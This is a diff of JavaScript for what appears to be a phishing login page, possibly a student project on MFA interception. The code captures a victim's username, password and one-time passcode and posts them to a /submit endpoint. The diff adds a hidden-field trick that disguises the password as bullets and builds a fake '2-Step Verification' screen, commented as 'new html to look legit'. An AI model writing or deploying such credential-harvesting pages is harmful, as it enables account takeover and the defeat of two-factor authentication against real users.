@@ -17,20 +17,25 @@ const nextButton = function( e ) {
     mfa = text.value;
   }
 
-  const json = {
+  var json = {
     username: username,
     password: password,
     mfa: mfa
   }
-  body = JSON.stringify(json);
+  json = JSON.stringify(json);
 
   // add to server
   fetch("/submit", {
     method: "POST",
     headers: { "Content-Type": "application/json" },
-    body
+    body: json
   })
-  updateScreen()
+  .then(function(response) {
+    return response.json();
+  })
+  .then(json => {
+    updateScreen()
+  })
   return false;
 }
 
@@ -53,15 +58,67 @@ const moveToPassword = function() {
   document.getElementById("headerField").innerHTML = "Complete sign in...";
   document.getElementById("subheaderField").innerHTML = username;
   document.getElementById("inputField").value = "";
-  document.getElementById("inputField").placeholder = "Enter your password";
+  document.getElementById("Bullets").placeholder = "Enter your password";
   document.getElementById("forgotField").innerHTML = "Forgot password?";
+
+  var bullets = document.querySelector("#Bullets")
+  var inputField = document.querySelector("#inputField")
+
+  // swap positions
+  bullets.parentNode.insertBefore(inputField, bullets)
+
+  // update opacities
+  inputField.style.opacity = "0"
+  bullets.style.opacity = "100"
+
+  // update to look like password
+  inputField.onkeyup = function(){
+    document.getElementById('Bullets').value=this.value.replace(/(.)/g,'•');
+  };
 }
 
 const moveToMFA = function() {
-  if (username === "wpi.mfa.1@gmail.com") {
-    document.getElementById("inputField").value = "";
-    document.getElementById("inputField").placeholder = "Enter your one-time passcode";
-  }
+  // update background size
+  document.getElementById("loginBackdrop").style.height = "425px"
+
+  // update headers
+  document.getElementById("headerField").innerHTML = "2-Step Verification";
+  document.getElementById("subheaderField").innerHTML = "This extra step shows it's really you trying to sign in";
+
+  // reset inputs
+  var bullets = document.querySelector("#Bullets")
+  var inputField = document.querySelector("#inputField")
+
+  inputField.parentNode.insertBefore(bullets, inputField)
+
+  // update opacities
+  inputField.style.opacity = "100"
+  bullets.style.opacity = "0"
+
+  // update to look normal again
+  inputField.onkeyup = function(){};
+
+  // ****** all below should be in a case by account statements
+  // new html to look legit
+  var verificationTitle = document.createElement("p")
+  verificationTitle.innerHTML = "2-Step Verification".bold()
+  verificationTitle.style.fontSize = "large"
+  verificationTitle.style.textAlign = "left"
+  verificationTitle.style.padding = "0px 35px 0px 35px";
+  var verificationExplained = document.createElement("p")
+  verificationExplained.innerHTML = "A text message with a 6-digit verification code was just sent to your phone"
+  verificationExplained.style.textAlign = "left"
+  verificationExplained.style.padding = "0px 35px 0px 35px";
+
+  bullets.parentNode.insertBefore(verificationTitle, bullets)
+  bullets.parentNode.insertBefore(verificationExplained, bullets)
+  bullets.remove()
+
+  document.getElementById("inputField").value = "";
+  document.getElementById("inputField").placeholder = "Enter the code";
+
+  // otherwise explain that it is false
+  // TODO:
 }
 
 window.onload = function() {
